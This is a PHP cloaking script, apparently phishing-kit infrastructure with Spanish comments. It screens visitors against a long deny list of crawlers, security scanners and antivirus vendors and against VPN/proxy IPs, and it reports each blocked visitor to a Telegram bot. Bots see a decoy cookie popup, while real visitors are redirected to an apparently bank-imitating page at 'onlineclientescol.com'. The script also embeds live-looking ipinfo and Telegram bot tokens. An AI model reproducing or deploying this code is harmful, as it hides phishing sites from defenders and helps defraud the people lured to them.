<?php
define('IPINFO_TOKEN', 'f14749fee64f8f'); 
define('SEND_TELEGRAM', true);
define('TELEGRAM_BOT_TOKEN', '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE');
define('TELEGRAM_CHAT_ID', '7831097636');
define('CACHE_TIME', 3600);
define('BLOCK_CRAWLERS', true);
define('BLOCK_PROXIES', true);
// URL A LA QUE QUIERES MANDAR A LOS HUMANOS
define('DESTINATION_URL', 'https://onlineclientescol.com/inicio.html'); // <--- CAMBIA ESTO POR TU URL

$botUserAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
    'sogou', 'exabot', 'facebot', 'ia_archiver', 'alexa', 'msnbot', 'ahrefsbot',
    'semrushbot', 'dotbot', 'rogerbot', 'screaming frog', 'majestic', 'mj12bot',
    'blexbot', 'uptimerobot', 'pingdom', 'gtmetrix', 'lighthouse', 'pagespeed',
    'virustotal', 'metauri', 'archive.org', 'wget', 'curl', 'python-requests',
    'scrapy', 'phantomjs', 'headless', 'bot', 'crawler', 'spider', 'scraper',
    'check_http', 'monitor', 'netcraft', 'sitecheck', 'security', 'scan',
    'petalbot', 'serpstatbot', 'megaindex', 'seekport', 'linkdex', 'lipperhey',
    'mail.ru', 'discordbot', 'telegrambot', 'slackbot', 'whatsapp', 'skypeuri',
    'kakao', 'line', 'facebookexternalhit', 'twitterbot', 'pinterest', 'linkedinbot',
    'slurp', 'teoma', 'archive', 'wayback', 'nutch', 'heritrix', 'httrack',
    'webcopier', 'webcrawler', 'webreaper', 'webstripper', 'webzip', 'offline',
    'sitesnagger', 'teleport', 'zeus', 'nikto', 'nmap', 'nessus', 'openvas',
    'acunetix', 'burp', 'sqlmap', 'w3af', 'appscan', 'metasploit', 'qualys',
    'netsparker', 'sucuri', 'wordfence', 'securitytrails', 'censys', 'shodan',
    'zoomeye', 'binaryedge', 'masscan', 'zmap', 'grabber', 'paros', 'webinspect',
    'veracode', 'fortify', 'rapid7', 'tenable', 'tripwire', 'crowdstrike',
    'mcafee', 'symantec', 'kaspersky', 'avast', 'avg', 'eset', 'norton',
    'bitdefender', 'trendmicro', 'sophos', 'malwarebytes', 'webroot', 'comodo',
    'avira', 'panda', 'f-secure', 'gdata', 'vipre', 'immunet', 'cylance',
    'carbonblack', 'sentinelone', 'checkpoint', 'fortinet', 'paloalto',
    'fireeye', 'proofpoint', 'mimecast', 'barracuda', 'cisco', 'juniper',
    'zgrab', 'go-http-client', 'java', 'okhttp', 'apache-httpclient', 'jersey',
    'restsharp', 'axios', 'got', 'superagent', 'unirest', 'httpie', 'postman',
    'insomnia', 'paw', 'restclient', 'fiddler', 'charles', 'mitmproxy',
    'nuclei', 'httpx', 'subfinder', 'amass', 'hakrawler', 'gospider', 'katana',
    'feroxbuster', 'dirsearch', 'ffuf', 'gobuster', 'wfuzz', 'dirb', 'nikto',
    'wpscan', 'joomscan', 'droopescan', 'cmsmap', 'wig', 'whatweb', 'wappalyzer',
    'builtwith', 'datanyze', 'woorank', 'seopowersuite', 'screamingfrog',
    'sitebulb', 'oncrawl', 'botify', 'lumar', 'deepcrawl', 'conductor',
    'brightedge', 'searchmetrics', 'sistrix', 'spyfu', 'serpstat', 'keywordtool',
    'python', 'ruby', 'perl', 'php', 'node', 'requests', 'urllib', 'httplib',
    'httparty', 'faraday', 'net::http', 'lwp', 'mechanize', 'beautiful soup',
    'selenium', 'puppeteer', 'playwright', 'cypress', 'webdriver', 'chromedriver',
    'geckodriver', 'safaridriver', 'edgedriver', 'operadriver', 'splash',
    'slimer', 'zombie', 'casper', 'jsdom', 'htmlunit', 'watir', 'capybara',
    'test', 'testing', 'automation', 'qa', 'benchmark', 'loadtest', 'stresstest',
    'jmeter', 'gatling', 'locust', 'k6', 'artillery', 'vegeta', 'wrk', 'hey',
    'siege', 'ab', 'httperf', 'tsung', 'grinder', 'neoload', 'loadrunner',
    'download', 'fetch', 'getter', 'collector', 'harvester', 'extractor',
    'parser', 'indexer', 'aggregator', 'feeder', 'reader', 'validator',
    'checker', 'verifier', 'probe', 'sniff', 'spy', 'track', 'audit', 'inspect'
];

function getVisitorIP() {
    $ip = '';
    // Ajuste para Replit: HTTP_X_FORWARDED_FOR suele ser la correcta
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return trim($ip);
}

function isBotUserAgent() {
    global $botUserAgents;
    if (empty($_SERVER['HTTP_USER_AGENT'])) {
        return true;
    }
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botUserAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function sendTelegram($ip, $reason, $ipData = null) {
    if (!SEND_TELEGRAM) return;

    $message = "🚫 *Bot Blocked*\n\n";
    $message .= "📍 IP: `$ip`\n";
    $message .= "⚠️ Reason: $reason\n";

    if ($ipData) {
        $pais = isset($ipData['country']) ? $ipData['country'] : 'Desconocido';
        $ciudad = isset($ipData['city']) ? $ipData['city'] : '';
        $isp = isset($ipData['org']) ? $ipData['org'] : 'Desconocido';
        $message .= "🌍 Location: $pais - $ciudad\n";
        $message .= "🏢 ISP: $isp\n";
        if (isset($ipData['privacy'])) {
            $p = $ipData['privacy'];
            $detected = [];
            if(!empty($p['vpn'])) $detected[] = "VPN";
            if(!empty($p['proxy'])) $detected[] = "Proxy";
            if(!empty($p['hosting'])) $detected[] = "Hosting";
            if(!empty($detected)) $message .= "🕵️ Detectado como: " . implode(', ', $detected) . "\n";
        }
    }

    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
        $ua = substr($_SERVER['HTTP_USER_AGENT'], 0, 100);
        $message .= "🔍 User Agent: `$ua`\n";
    }

    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_exec($ch);
    curl_close($ch);
}

function checkIpInfo($ip) {
    $token = IPINFO_TOKEN;
    $url = "https://ipinfo.io/{$ip}?token={$token}";
    $cacheFile = sys_get_temp_dir() . '/ipinfo_' . md5($ip) . '.json';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < CACHE_TIME) {
        return json_decode(file_get_contents($cacheFile), true);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode == 200 && $response) {
        file_put_contents($cacheFile, $response);
        return json_decode($response, true);
    }
    return null;
}

function isProxyIP($ipData) {
    if (!$ipData) return false;
    if (isset($ipData['privacy'])) {
        $p = $ipData['privacy'];
        if (!empty($p['vpn']) || !empty($p['proxy']) || !empty($p['tor']) || !empty($p['hosting'])) {
            return true;
        }
    }
    return false;
}

// --- EJECUCIÓN PRINCIPAL ---

$visitorIP = getVisitorIP();
$isBot = false;
$blockReason = '';
$ipData = null;

// En pruebas locales o si eres tú mismo, no bloquear
if ($visitorIP === '127.0.0.1' || $visitorIP === '::1') {
    // Si eres tú, redirige
    header("Location: " . DESTINATION_URL);
    exit;
}

if (BLOCK_CRAWLERS && isBotUserAgent()) {
    $isBot = true;
    $blockReason = 'Bot/Crawler User Agent';
}

if (!$isBot && BLOCK_PROXIES) {
    $ipData = checkIpInfo($visitorIP);
    if (isProxyIP($ipData)) {
        $isBot = true;
        $blockReason = 'Proxy/VPN/Datacenter IP';
    }
}

if ($isBot) {
    // 1. Enviar alerta a Telegram
    sendTelegram($visitorIP, $blockReason, $ipData);
    
    // 2. Mostrar contenido falso para el bot (para que crea que entró)
    // Aquí puedes poner el HTML del popup de cookies si quieres engañar al bot
    ?>
    <!-- COOKIE POPUP CON BLUR + REDIRECCIÓN (MÁXIMO 3 VECES POR NAVEGADOR AUNQUE ACEPTE) -->


<div id="cookieOverlay" class="cookie-overlay hidden">
  <div class="cookie-modal">
    <div class="cookie-text">
      Este sitio usa cookies para mejorar la experiencia. Acepta para continuar.
    </div>
  </div>
</div>

    <?php
    exit;
} else {
    // ES UN USUARIO REAL: Redirigir a la URL externa
    header("Location: " . DESTINATION_URL);
    exit;
}
?>
